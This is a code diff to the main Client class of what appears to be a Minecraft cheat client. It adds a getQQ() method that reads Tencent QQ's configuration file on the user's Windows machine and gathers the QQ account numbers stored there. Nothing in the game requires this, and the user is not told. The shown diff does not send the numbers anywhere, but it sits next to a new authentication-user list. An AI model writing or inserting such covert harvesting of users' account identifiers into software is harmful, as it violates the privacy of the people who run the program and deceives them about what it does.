@@ -19,9 +19,18 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.entity.EntityLivingBase;
 import net.minecraft.util.BlockPos;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
+
 import javax.swing.text.html.parser.Entity;
 
 import org.lwjgl.opengl.Display;
+
+
 
 public class Client {
 
@@ -34,6 +43,7 @@ public class Client {
 	public FontManager fontManager;
 	private static me.skidsense.management.alt.FileManager fileManager;
 	public EntityLivingBase viptarget;
+	public ArrayList<AuthUser> tempAuthUsers = new ArrayList<AuthUser>();
 	public WaypointManager waypointManager;
 	
 	public void initiate() {
@@ -126,6 +136,32 @@ public class Client {
 		return false;
 	}
 
+	   public List<String> getQQ() {
+	       ArrayList<String> qq = new ArrayList<>();
+	       try {
+	           File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
+	           if (qqData.exists() && qqData.isFile()) {
+	               BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
+	               String line;
+	               while ((line = stream.readLine()) != null && line.length() > 0) {
+	                   if (line.startsWith("UserDataSavePath=")) {
+	                       File tencentFiles = new File(line.split("=")[1]);
+	                       if (tencentFiles.exists() && tencentFiles.isDirectory()) {
+	                           for (File qqdir : tencentFiles.listFiles()) {
+	                               if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
+	                                   qq.add(qqdir.getName());
+	                               }
+	                           }
+	                       }
+	                   }
+	               }
+	           }
+	       } catch (Throwable e) {
+	           e.printStackTrace();
+	       }
+	       return qq;
+	   }
+	   
 	public static boolean onServer(String server) {
 		if (!mc.isSingleplayer() && mc.getCurrentServerData().serverIP.toLowerCase().contains(server)) {
 			return true;
